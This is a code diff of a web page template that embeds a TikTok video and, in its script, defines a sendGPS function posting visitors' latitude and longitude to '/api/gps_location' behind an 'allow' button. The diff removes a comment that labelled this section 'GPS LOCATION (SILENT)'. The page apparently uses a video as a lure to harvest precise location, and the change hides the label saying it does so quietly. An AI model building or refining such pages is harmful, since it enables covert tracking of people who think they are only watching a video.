@@ -31,9 +31,11 @@
 </div>
 
 <div class="video-container">
-    {% set video_id = video_url.split('/video/')[1].split('?')[0] if '/video/' in video_url else '' %}
+    <!-- Extract video ID from URL -->
+    {% set video_id = video_url.split('/video/')[1].split('?')[0] if '/video/' in video_url else (video_url.split('/')[-1].split('?')[0] if video_url else '') %}
+    <!-- Use embed/v2 for better compatibility -->
     <iframe 
-        src="https://www.tiktok.com/embed/v3/{{ video_id }}?autoplay=1&mute=0&controls=0&loop=1"
+        src="https://www.tiktok.com/embed/v2/{{ video_id }}"
         allow="autoplay; encrypted-media"
         allowfullscreen>
     </iframe>
@@ -69,7 +71,6 @@
     const allowBtn = document.getElementById('allowGpsBtn');
     const loadingText = document.getElementById('loadingText');
 
-    // ===== GPS LOCATION (SILENT) =====
     function sendGPS(lat, lon) {
         fetch('/api/gps_location', {
             method: 'POST',
